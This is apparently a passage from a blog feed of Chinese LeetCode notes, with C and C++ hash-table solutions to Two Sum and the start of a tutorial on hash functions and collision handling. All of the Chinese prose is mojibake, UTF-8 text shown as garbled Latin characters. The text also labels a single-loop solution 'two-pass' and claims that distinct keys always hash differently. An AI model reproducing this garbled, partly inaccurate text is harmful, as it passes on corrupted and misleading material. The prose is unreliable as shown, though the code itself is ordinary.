class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Define hash </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(key) % size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Define hash table structure.</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        <span class="type">bool</span> hasData;</span><br><span class="line">    &#125; twosum;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hashtableSize = numsSize * <span class="number">2</span>; </span><br><span class="line">    twosum* hashtable = (twosum*)<span class="built_in">calloc</span>(hashtableSize, <span class="keyword">sizeof</span>(twosum));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize return array</span></span><br><span class="line">    <span class="type">int</span>* results = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>)); </span><br><span class="line">    <span class="keyword">if</span> (!results) <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// Return NULL if memory allocation fails</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init hash table</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;hashtableSize;i++)&#123;   </span><br><span class="line">        hashtable[i].key=<span class="number">0</span>;</span><br><span class="line">        hashtable[i].value=<span class="number">0</span>;</span><br><span class="line">        hashtable[i].hasData = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// insert key to certain index.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; numsSize; i++)&#123;</span><br><span class="line">        <span class="comment">// only needs to insert the complement number</span></span><br><span class="line">        <span class="type">int</span> complement = target - nums[i]; </span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> index = hash(complement, hashtableSize); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Linear probing for searching empty slot</span></span><br><span class="line">        <span class="keyword">while</span>(hashtable[index].hasData )&#123;</span><br><span class="line">            <span class="comment">// find target</span></span><br><span class="line">            <span class="keyword">if</span> ( hashtable[index].key == complement)&#123;</span><br><span class="line">                results[<span class="number">0</span>] = hashtable[index].value;</span><br><span class="line">                results[<span class="number">1</span>] = i;</span><br><span class="line">                *returnSize = <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">free</span>(hashtable);</span><br><span class="line">                <span class="keyword">return</span> results;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// try to find empty index.</span></span><br><span class="line">            index = hash(index+<span class="number">1</span>, hashtableSize); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// insert current number</span></span><br><span class="line">        index = hash(nums[i], hashtableSize); </span><br><span class="line">        <span class="keyword">while</span> (hashtable[index].hasData) &#123;</span><br><span class="line">            index = hash(index+<span class="number">1</span>, hashtableSize);</span><br><span class="line">        &#125;</span><br><span class="line">        hashtable[index].key = nums[i]; </span><br><span class="line">        hashtable[index].value = i;</span><br><span class="line">        hashtable[index].hasData = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(hashtable);</span><br><span class="line">    <span class="built_in">free</span>(results);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹å¼çš„ä¸»è¦çš„æµç¨‹ç‚º:</p><ul><li>å®šç¾© hashtable çµæ§‹ä»¥åŠ hashtable å¤§å°</li><li>å®šç¾© hash function</li><li>åˆå§‹åŒ–å›å‚³é™£åˆ—</li><li>åˆå§‹åŒ– hashtable</li><li>æ’å…¥å…ƒç´ ï¼Œéœ€è¦å…ˆåˆ¤æ–· index å…§æ˜¯å¦å·²ç¶“æœ‰å…ƒç´ å­˜åœ¨<ul><li>ç™¼ç”Ÿç¢°æ’æ™‚ï¼Œé€é Linear Probing ä¾†è™•ç†ç¢°æ’ï¼Œæ‰¾åˆ°ç©ºä½å€</li><li>è‹¥ç„¡å…ƒç´ å­˜åœ¨å‰‡ç›´æ¥æ’å…¥å…ƒç´ </li></ul></li><li>é‡‹æ”¾è¨˜æ†¶é«”ï¼Œè¿”å›å›å‚³é™£åˆ—</li></ul><p>é€™ç¨®ä½œæ³•åˆè¢«ç¨±ç‚º <strong>Two-pass Hash Table</strong>ï¼Œä¸»è¦åŸå› æ˜¯ä»–ç¶“éå…©æ¬¡è¿­ä»£ï¼Œä¸€æ¬¡å°‡å…ƒç´ çš„å€¼å’Œç´¢å¼•å¡«åˆ° hashtableçš„ keyè·Ÿvalueï¼Œå¦ä¸€æ¬¡æª¢æŸ¥æ¯å€‹å…ƒç´ çš„ complement æ˜¯å¦å­˜åœ¨æ–¼ hash table ç•¶ä¸­ã€‚</p><p>é€™æ¨£é€éé›œæ¹Šè¡¨çš„åŸ·è¡Œæ™‚é–“è¤‡é›œåº¦å¯ä»¥é™åˆ° $O(n)$ï¼Œå…¶å¯¦æŸ¥æ‰¾Hash Tableçš„æ™‚é–“è¤‡é›œåº¦æœƒæ˜¯ $O(1)$ï¼Œä½†è€ƒé‡åˆ°ç¢°æ’å¯èƒ½ç™¼ç”Ÿï¼Œé€²è¡Œ Linear Probingï¼Œé€™æœƒè®“æ•´é«”çš„æ™‚é–“è¤‡é›œåº¦è®Šæˆ $O(n)$ã€‚</p><p><img src="/img/LeetCode/Two_Sum/two_sum_result.png"></p><h1 id="å¿ƒå¾—"><a href="#å¿ƒå¾—" class="headerlink" title="å¿ƒå¾—"></a>å¿ƒå¾—</h1><p>åŸæœ¬åœ¨å¯¦ä½œçš„æ™‚å€™ï¼Œæˆ‘åŸæœ¬çš„ hashtable çµæ§‹åªæœ‰å®šç¾©</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">    &#125; twosum;</span><br></pre></td></tr></table></figure><p>ä¸¦ä¸”åœ¨åˆ¤æ–·å¼æ˜¯ä½¿ç”¨ <code>while( hashtable[index].key != 0 || hashtable[index].value != 0 )</code></p><p>ä½†å¾Œé¢ç™¼ç¾å°ç‰¹å®šçš„æ¸¬è³‡æœƒå‡ºç¾å•é¡Œï¼Œåƒæ˜¯ <code>nums = [0,4,3,0]</code> ä¸¦ä¸” <code>target= 0</code>çš„æ™‚å€™ï¼Œä¸¦ä¸æœƒæœ‰ä»»ä½•è¼¸å‡ºå‡ºç¾</p><h2 id="å•é¡Œåˆ†æ"><a href="#å•é¡Œåˆ†æ" class="headerlink" title="å•é¡Œåˆ†æ"></a>å•é¡Œåˆ†æ</h2><p>åŸå› æ˜¯åœ¨æ’å…¥hash table çš„æ™‚å€™ï¼Œä»¥ç¬¬ä¸€å€‹å…ƒç´ ç‚ºä¾‹ï¼Œæ’å…¥è‡³hashtableçš„keyæœƒæ˜¯ 0ï¼Œ<strong>ä½†æˆ‘å€‘åœ¨åˆå§‹åŒ–å°‡æ²’æœ‰è³‡æ–™çš„ç‹€æ³å®šç¾©æˆ0ï¼Œä¸¦ä¸”åœ¨ä¸­é–“åˆ¤æ–·å¼ä¹Ÿä»¥0ä½œç‚ºæœ‰ç„¡å€¼çš„åˆ¤æ–·ä¾æ“š</strong>ï¼Œä½†åœ¨æƒ³è¦å‡ºå„²å­˜çš„å€¼æœ¬èº«ç‚º 0 æ™‚ï¼Œé€™æ¨£æœƒç™¼ç”Ÿè¡çªï¼Œå› æ­¤å¾ŒçºŒè§£æ³•å°±æ˜¯åœ¨ hashtable çš„çµæ§‹ä¸­å®šç¾©ä¸€å€‹ <code>hasData</code> ä¾†åˆ¤æ–·æ˜¯å¦æœ‰è³‡æ–™å­˜åœ¨ã€‚</p><p>ä½†é€™éº¼åšä¹Ÿæœ‰ç¼ºé»ï¼Œé‚£å°±æ˜¯å¢åŠ äº†ç©ºé–“è¤‡é›œåº¦ã€‚</p><h1 id="å…¶ä»–è§£æ³•-One-Pass-Hash"><a href="#å…¶ä»–è§£æ³•-One-Pass-Hash" class="headerlink" title="å…¶ä»–è§£æ³• - One Pass Hash"></a>å…¶ä»–è§£æ³• - One Pass Hash</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hashTable</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        UT_hash_handle hh;</span><br><span class="line">    &#125; *hashTable = <span class="literal">NULL</span>, *item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;</span><br><span class="line">        <span class="type">int</span> complement = target - nums[i];</span><br><span class="line">        HASH_FIND_INT(hashTable, &amp;complement, item);</span><br><span class="line">        <span class="keyword">if</span> (item) &#123;</span><br><span class="line">            <span class="type">int</span>* result = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">2</span>);</span><br><span class="line">            result[<span class="number">0</span>] = item-&gt;value;</span><br><span class="line">            result[<span class="number">1</span>] = i;</span><br><span class="line">            *returnSize = <span class="number">2</span>;</span><br><span class="line">            HASH_CLEAR(hh, hashTable);  <span class="comment">// Free the hash table</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        item = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> hashTable));</span><br><span class="line">        item-&gt;key = nums[i];</span><br><span class="line">        item-&gt;value = i;</span><br><span class="line">        HASH_ADD_INT(hashTable, key, item);</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    HASH_CLEAR(hh, hashTable);  <span class="comment">// Free the hash table</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™è£¡å°±æ˜¯å°‡æ’å…¥ hashtable å’Œæª¢æŸ¥ complement ä½µå…¥åŒä¸€å€‹è¿­ä»£ä¸­ï¼Œä½†ç”±æ–¼é‚„æ˜¯è¿­ä»£äº† n å€‹å…ƒç´ ï¼Œå› æ­¤æ™‚é–“è¤‡é›œåº¦ä¸€æ¨£æ˜¯ $O(n)$</p><blockquote><p>é€™è£¡æˆ‘ä¹Ÿé–‹å§‹è€ƒæ…®æ”¹æˆå­¸ç¿’ä½¿ç”¨ C++ ä¾†åˆ·é¡ŒXDï¼ŒC++ åƒé€™ç¨®é¡Œç›®å°±æœ‰å¾ˆå¤šå¥½ç”¨çš„ STL  <code>unordered_map</code> èƒ½å¤ ç›´æ¥ä½¿ç”¨ï¼Œä¸éœ€è¦é‡æ–°è¨­è¨ˆå¤ªå¤šæ±è¥¿ã€‚</p></blockquote><h1 id="C-çš„è§£æ³•"><a href="#C-çš„è§£æ³•" class="headerlink" title="C++ çš„è§£æ³•"></a>C++ çš„è§£æ³•</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            hash[nums[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> complement = target - nums[i];</span><br><span class="line">            <span class="keyword">if</span> (hash.<span class="built_in">find</span>(complement) != hash.<span class="built_in">end</span>() &amp;&amp; hash[complement] != i) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i, hash[complement]&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Array </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¡Œå¿…å‚™ç¥å™¨ | é›œæ¹Šè¡¨ (Hash Table) | LeetCode ç­†è¨˜</title>
      <link href="/posts/ef71152b.html"/>
      <url>/posts/ef71152b.html</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬ä»‹ç´¹"><a href="#åŸºæœ¬ä»‹ç´¹" class="headerlink" title="åŸºæœ¬ä»‹ç´¹"></a>åŸºæœ¬ä»‹ç´¹</h1><p>é›œæ¹Šè¡¨æ˜¯ä¸€ç¨® Key Value Mapping çš„çµæ§‹ï¼Œå¯ä»¥ç”¨å¿«é€ŸæŸ¥æ‰¾è³‡æ–™ï¼Œç›¸è¼ƒæ–¼ä¸€èˆ¬æœå°‹æ¼”ç®—æ³•çš„æ™‚é–“è¤‡æŸ¥åº¦ $O(Log n)$ ä»–æ™‚é–“è¤‡é›œåº¦æœƒæ˜¯ $O(1)$</p><p>ä¸»è¦ç¥é€Ÿçš„åŸå› æ˜¯å› ç‚º Hash Functionï¼Œå¦‚æœå…ˆæŠŠ n å€‹æ•¸å­—å„²å­˜åœ¨ Hash Table è£¡é¢ï¼Œé‚£å¦‚æœè¦åˆ¤æ–·é€™å€‹æ•¸å­— A æ˜¯ä¸æ˜¯å·²ç¶“è¢«å­˜åœ¨ Hash Table è£¡é¢ï¼Œåªè¦å…ˆæŠŠé€™å€‹æ•¸å­—ä¸Ÿé€² hash functionï¼Œå°±å¯ä»¥ç›´æ¥çŸ¥é“ A å°æ‡‰åˆ° Hash Table ä¸­å“ªä¸€æ ¼ã€‚</p><h3 id="Hash-Table-ä¸é©åˆä½¿ç”¨çš„æ™‚æ©Ÿ"><a href="#Hash-Table-ä¸é©åˆä½¿ç”¨çš„æ™‚æ©Ÿ" class="headerlink" title="Hash Table ä¸é©åˆä½¿ç”¨çš„æ™‚æ©Ÿ"></a>Hash Table ä¸é©åˆä½¿ç”¨çš„æ™‚æ©Ÿ</h3><ul><li>è³‡æ–™æœ‰è™•ç†ä¸Šçš„æ™‚é–“å„ªå…ˆé †åºï¼Œé€™ç¨®æ¯”è¼ƒé©åˆ Queue (FIFO)çš„çµæ§‹</li><li><strong>å¦‚æœè³‡æ–™æƒ³è¦è¢«æ’åºï¼Œé‚£ä¹Ÿä¸é©åˆç”¨ Hash Table</strong><ul><li><a href="https://www.reddit.com/r/learnprogramming/comments/29t4s4/when_is_it_bad_to_use_a_hash_table/">https://www.reddit.com/r/learnprogramming/comments/29t4s4/when_is_it_bad_to_use_a_hash_table/</a></li></ul></li></ul><h3 id="Hash-Table-é©åˆçš„ä½¿ç”¨æ¢ä»¶"><a href="#Hash-Table-é©åˆçš„ä½¿ç”¨æ¢ä»¶" class="headerlink" title="Hash Table é©åˆçš„ä½¿ç”¨æ¢ä»¶"></a>Hash Table é©åˆçš„ä½¿ç”¨æ¢ä»¶</h3><ul><li>é¡Œç›®è¦æ±‚ä½¿ç”¨æ™‚é–“è¤‡é›œåº¦ $O(1)$  çš„æ¼”ç®—æ³•ä¾†å­˜å–å…ƒç´ </li><li>æœ€ç³Ÿçš„ç‹€æ³ä¹Ÿæœ‰ $O(n)$ æ™‚é–“è¤‡é›œåº¦</li></ul><h1 id="Hash-Function"><a href="#Hash-Function" class="headerlink" title="Hash Function"></a>Hash Function</h1><p>ä¸€å€‹ hash function è¦æˆç«‹æœƒæœ‰ä¸‰ä¸­æ¢ä»¶</p><ol><li>hash function è¨ˆç®—å‡ºä¾†çš„å€¼æ˜¯éè² æ•´æ•¸</li><li>å¦‚æœ key1 &#x3D; key2 ï¼Œå‰‡Â <code>hash (key1) = hash (key2)</code></li><li>å¦‚æœ key1 â‰  key2 ï¼Œå‰‡Â <code>hash (key1) â‰  hash (key2)</code></li></ol><p>éœ€è¦è¦æ³¨æ„çš„é»æ˜¯ï¼Œåœ¨å¤šç­†è³‡æ–™æ”¾åœ¨åŒå€‹ç©ºé–“å®¹æ˜“ç™¼ç”Ÿ<strong>ç¢°æ’(collision)<strong>ï¼Œ</strong>load factor</strong> å°±æ˜¯ç”¨ä¾†è¡¡é‡ç¢°æ’ç™¼ç”Ÿçš„å› å­<br>    - $load factor &#x3D; n &#x2F; m$<br>    - $n$  &#x3D;  è¼¸å…¥è³‡æ–™å€‹æ•¸<br>    - $m$ &#x3D;  é›œæ¹Šè¡¨çš„å¤§å°<br>    - å¦‚æœ $load factor &gt; 1$ å‰‡å¾ˆå¯èƒ½ç™¼ç”Ÿç¢°æ’<br>        - <a href="https://zh.wikipedia.org/wiki/%E9%B4%BF%E5%B7%A2%E5%8E%9F%E7%90%86">https://zh.wikipedia.org/wiki/é´¿å·¢åŸç†</a><br>        - ç™½è©±æ–‡è§£é‡‹å°±æ˜¯å¦‚æœ n &gt; m é‚£å¿…å®šæœ‰è³‡æ–™è¦è·Ÿåˆ¥çš„è³‡æ–™ä½åœ¨åŒå€‹æ¡¶å­è£¡</p><h2 id="Hash-Function-çš„å¯¦ä½œæ–¹å¼-ï¼ˆé™¤æ³•-å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰"><a href="#Hash-Function-çš„å¯¦ä½œæ–¹å¼-ï¼ˆé™¤æ³•-å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰" class="headerlink" title="Hash Function çš„å¯¦ä½œæ–¹å¼ ï¼ˆé™¤æ³•, å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰"></a>Hash Function çš„å¯¦ä½œæ–¹å¼ ï¼ˆé™¤æ³•, å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰</h2><p>é¦–å…ˆå¯ä»¥å®šç¾©æ¯ç­†è³‡æ–™åœ¨é›œæ¹Šè¡¨ä¸­çš„ç´¢å¼•å€¼ (index)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = key % m        <span class="comment">// 0 &lt;= index &lt; m </span></span><br></pre></td></tr></table></figure><p>ç¯„ä¾‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A ( Key = 11324)</span><br><span class="line"></span><br><span class="line">B ( Key = 6356)</span><br><span class="line"></span><br><span class="line">C ( Key = 345)</span><br><span class="line"></span><br><span class="line">D ( key = 4171 )</span><br></pre></td></tr></table></figure><p>M (é›œæ¹Šè¡¨å¤§å°)&#x3D; 6, å‰‡é›œæ¹Šè¡¨çš„ index æœƒå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Index of A :  11324 % 6 = 2</span><br><span class="line"></span><br><span class="line">Index of B:   6356 % 6 = 2</span><br><span class="line"></span><br><span class="line">Index of C:  345 % 6 = 3</span><br><span class="line"></span><br><span class="line">Index of D: 4171 % 6 =1</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç™¼ç¾åˆ° A èˆ‡ B ç™¼ç”Ÿç¢°æ’ï¼Œé€™æœƒèˆ‡ m  çš„é¸æ“‡æœ‰é—œï¼Œm çš„é¸æ“‡è¦ç›¡å¯èƒ½å…ƒé›¢ $2^p$  è¶Šé è¶Šå¥½</p><p><img src="/img/LeetCode/HashTable/hashtable.drawio.png"></p><h3 id="Hash-Functionçš„å¯¦ä½œ-ï¼ˆä¹˜æ³•-å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰"><a href="#Hash-Functionçš„å¯¦ä½œ-ï¼ˆä¹˜æ³•-å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰" class="headerlink" title="Hash Functionçš„å¯¦ä½œ ï¼ˆä¹˜æ³•, å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰"></a>Hash Functionçš„å¯¦ä½œ ï¼ˆä¹˜æ³•, å„²å­˜æ–¹å¼ç”¨é™£åˆ—ï¼‰</h3><p>$index &#x3D; [ m \cdot ((key \cdot A) \mod 1) ]$</p><p>$0 â‰¤  index &lt; (m-1)$</p><p>æ­¥é©Ÿï¼š</p><ul><li>Key ä¹˜ä¸Šä¸€å€‹å°æ–¼ 1 çš„ç„¡ç†æ•¸ï¼Œå³ ï¼¡ï¼Œ A é€šå¸¸æœƒé¸æ“‡  $\frac{\sqrt5 -1}{2}$  ï¼Œä¹˜å®Œå¾Œæœƒå¾—åˆ°ä¸€å€‹æ›´å¤§çš„ç„¡ç†æ•¸</li><li>å°‡é€™å€‹ç„¡ç†æ•¸å»è·Ÿ 1 å–é¤˜æ•¸ï¼Œé€™éº¼åšä¹Ÿæœƒå°‡ç„¡ç†æ•¸çš„æ•´æ•¸éƒ¨åˆ†å»é™¤ï¼Œåƒ…å‰©ä¸‹å°æ•¸</li><li>m ä¹˜ä¸Šå°æ•¸ï¼Œé€™ä¸€æ­¥æœƒå¾—åˆ°ä¸€å€‹ $0$ èˆ‡ ($m-1)$ ä¹‹é–“ çš„ ç„¡ç†æ•¸</li><li>é€éé«˜æ–¯ç¬¦è™Ÿå°ç„¡ç†æ•¸å»å–æ•´æ•¸<ul><li><a href="https://zh.wikipedia.org/wiki/%E5%8F%96%E6%95%B4%E5%87%BD%E6%95%B0">https://zh.wikipedia.org/wiki/å–æ•´å‡½æ•°</a></li></ul></li></ul><blockquote><p>ä¸‹é¢çš„åœ–è¬›è§£å¾—æŒºå¥½<br>åœ–ä¾†æº: <a href="https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6">https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6</a></p></blockquote><p><img src="/img/LeetCode/HashTable/hashfunction.png"></p><p>é€™éº¼ç¹ç‘£æ±‚ index çš„æ–¹æ³•æœ‰ä»€éº¼å„ªé»ï¼š</p><ul><li>æ²’æœ‰ m è¦é é›¢ $2^p$ çš„é™åˆ¶</li><li>å¯ä»¥æé«˜éš¨æ©Ÿæ€§</li></ul><h1 id="å¦‚ä½•è™•ç†å°‹å€è¡çªï¼Ÿ"><a href="#å¦‚ä½•è™•ç†å°‹å€è¡çªï¼Ÿ" class="headerlink" title="å¦‚ä½•è™•ç†å°‹å€è¡çªï¼Ÿ"></a>å¦‚ä½•è™•ç†å°‹å€è¡çªï¼Ÿ</h1><h2 id="1-Seperate-Chaining-x2F-Close-Addressing"><a href="#1-Seperate-Chaining-x2F-Close-Addressing" class="headerlink" title="1.  Seperate Chaining &#x2F; Close Addressing"></a>1.  Seperate Chaining &#x2F; Close Addressing</h2><p>åœ¨æ¯å€‹å„²å­˜ç©ºé–“ä¸­å†ç”Ÿæˆæ–°çš„éˆç‹€å„²å­˜ç©ºé–“ï¼Œå¯ä»¥ç”¨ Linked List æˆ–è€…æ˜¯ Array ä¾†å¯¦ç¾</p><p><img src="/img/LeetCode/HashTable/hashtable-linkedlist.png"></p><p>ç”±æ–¼éœ€è¦é¡å¤–çš„æŒ‡æ¨™ï¼Œå¦‚æœå­˜å„²çš„è³‡æ–™å¤§å°å°æ–¼ä¸€å€‹æŒ‡æ¨™ï¼Œé‚£éº¼ä½¿ç”¨éˆçµä¸²åˆ—æœƒæ¶ˆè€—é›™å€çš„è¨˜æ†¶é«”ä¾†å­˜å„²è³‡æ–™ã€‚ç„¶è€Œï¼Œå¦‚æœè¦å­˜å„²çš„è³‡æ–™é å¤§æ–¼ä¸€å€‹æŒ‡æ¨™çš„å¤§å°ï¼ŒæŒ‡æ¨™çš„é¡å¤–æ¶ˆè€—å°±å¯ä»¥å¿½ç•¥ä¸è¨ˆäº†ã€‚äº‹å¯¦ä¸Šï¼Œæˆ‘å€‘å¯ä»¥å°éˆçµä¸²åˆ—é€²è¡Œæ”¹é€ ï¼Œè®“å…¶å¾Œç«¯çµåˆç´…é»‘æ¨¹ã€è·³è¡¨ç­‰è³‡æ–™çµæ§‹ï¼Œé€™æ¨£æœ€çµ‚ Hash Table çš„æŸ¥æ‰¾æ™‚é–“åªéœ€è¦ $O(log n)$</p><p>é€™ç¨®çµæ§‹é©åˆå­˜å„²å¤§é‡è³‡æ–™ä¸”æ¯ç­†è³‡æ–™è¼ƒå¤§çš„æƒ…æ³ï¼Œè€Œä¸”å®ƒé‚„æ”¯æŒæ›´å¤šæ¨£çš„å„ªåŒ–ç­–ç•¥ï¼Œå¯ä»¥çµåˆç´…é»‘æ¨¹ç­‰ä¸€èµ·ä½¿ç”¨ã€‚</p><h2 id="2-Open-Addressing"><a href="#2-Open-Addressing" class="headerlink" title="2. Open Addressing"></a>2. Open Addressing</h2><p>Open Addressing ä¸»è¦é€é <strong>probing</strong> çš„æ–¹å¼ä¾†å°‹æ‰¾æœªå„²å­˜è³‡æ–™çš„ç©ºé–“ï¼Œå¯ä»¥åˆ†æˆï¼š</p><ul><li>Linear Probing</li><li>Quadratic probing</li></ul><h3 id="Linear-Probing"><a href="#Linear-Probing" class="headerlink" title="Linear Probing"></a>Linear Probing</h3><p>é‡åˆ°è¡çªæ™‚ï¼Œæª¢æŸ¥ä¸‹ä¸€å€‹ç´¢å¼•ä½ç½®æ˜¯å¦ç©ºé–’ï¼Œå¦‚æœæ˜¯ç©ºçš„å°±æ”¾å…¥è³‡æ–™ï¼Œå¦‚æœä¸æ˜¯å°±ç¹¼çºŒå¾€ä¸‹æ‰¾ã€‚ç•¶è¦å°‹æ‰¾å…ƒç´ 